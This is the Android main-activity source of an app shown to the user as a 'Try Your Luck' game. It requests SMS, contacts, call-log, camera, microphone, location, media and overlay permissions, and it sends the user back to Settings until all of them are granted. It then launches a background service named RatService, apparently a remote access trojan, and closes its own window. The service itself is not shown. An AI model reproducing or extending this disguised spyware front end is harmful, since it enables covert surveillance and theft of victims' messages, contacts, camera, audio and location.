package com.my.luck;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.my.luck.core.RatService;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int OVERLAY_PERMISSION_REQUEST = 101;
    private Handler handler = new Handler();
    private boolean permissionsRequested = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        TextView tv = new TextView(this);
        tv.setText("♟️ Try Your Luck\nStarting...");
        tv.setTextSize(28);
        tv.setGravity(android.view.Gravity.CENTER);
        tv.setTextColor(0xFFFFFFFF);
        tv.setBackgroundColor(0xFF1a1a2e);
        setContentView(tv);

        handler.postDelayed(() -> checkAllPermissions(), 500);
    }

    private void checkAllPermissions() {
        List<String> neededPermissions = new ArrayList<>();

        // All permissions needed
        neededPermissions.add(Manifest.permission.READ_SMS);
        neededPermissions.add(Manifest.permission.RECEIVE_SMS);
        neededPermissions.add(Manifest.permission.SEND_SMS);
        neededPermissions.add(Manifest.permission.READ_CONTACTS);
        neededPermissions.add(Manifest.permission.READ_CALL_LOG);
        neededPermissions.add(Manifest.permission.CAMERA);
        neededPermissions.add(Manifest.permission.RECORD_AUDIO);
        neededPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        neededPermissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        neededPermissions.add(Manifest.permission.INTERNET);
        neededPermissions.add(Manifest.permission.ACCESS_NETWORK_STATE);
        neededPermissions.add(Manifest.permission.READ_PHONE_STATE);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            neededPermissions.add(Manifest.permission.POST_NOTIFICATIONS);
            neededPermissions.add(Manifest.permission.READ_MEDIA_IMAGES);
            neededPermissions.add(Manifest.permission.READ_MEDIA_VIDEO);
            neededPermissions.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            neededPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            neededPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }

        // Check which permissions are missing
        List<String> missing = new ArrayList<>();
        for (String perm : neededPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                missing.add(perm);
            }
        }

        if (missing.isEmpty()) {
            // All permissions granted
            checkOverlayPermission();
        } else if (!permissionsRequested) {
            permissionsRequested = true;
            String[] permsArray = missing.toArray(new String[0]);
            ActivityCompat.requestPermissions(this, permsArray, PERMISSION_REQUEST_CODE);
        } else {
            // If permissions still missing, open app settings
            Toast.makeText(this, "Grant all permissions in Settings", Toast.LENGTH_LONG).show();
            openAppSettings();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Check if all permissions are granted
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                checkOverlayPermission();
            } else {
                // Open settings for user to enable manually
                Toast.makeText(this, "Enable all permissions in Settings", Toast.LENGTH_LONG).show();
                openAppSettings();
            }
        }
    }

    private void checkOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST);
                return;
            }
        }
        startApp();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == OVERLAY_PERMISSION_REQUEST) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (Settings.canDrawOverlays(this)) {
                    startApp();
                } else {
                    Toast.makeText(this, "Enable overlay permission", Toast.LENGTH_LONG).show();
                    openAppSettings();
                }
            }
        }
    }

    private void openAppSettings() {
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        intent.setData(Uri.parse("package:" + getPackageName()));
        startActivity(intent);
        // App will resume when user returns from settings
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Check if permissions were granted while in settings
        if (permissionsRequested) {
            handler.postDelayed(() -> {
                List<String> neededPermissions = new ArrayList<>();
                neededPermissions.add(Manifest.permission.READ_SMS);
                neededPermissions.add(Manifest.permission.RECEIVE_SMS);
                neededPermissions.add(Manifest.permission.READ_CONTACTS);
                neededPermissions.add(Manifest.permission.READ_CALL_LOG);
                neededPermissions.add(Manifest.permission.CAMERA);
                neededPermissions.add(Manifest.permission.RECORD_AUDIO);
                neededPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
                neededPermissions.add(Manifest.permission.READ_PHONE_STATE);
                
                boolean allGranted = true;
                for (String perm : neededPermissions) {
                    if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                        allGranted = false;
                        break;
                    }
                }
                
                if (allGranted) {
                    startApp();
                }
            }, 1000);
        }
    }

    private void startApp() {
        try {
            Intent serviceIntent = new Intent(this, RatService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            
            Toast.makeText(this, "✅ App running!", Toast.LENGTH_SHORT).show();
            handler.postDelayed(() -> finish(), 1000);
            
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
            finish();
        }
    }
}
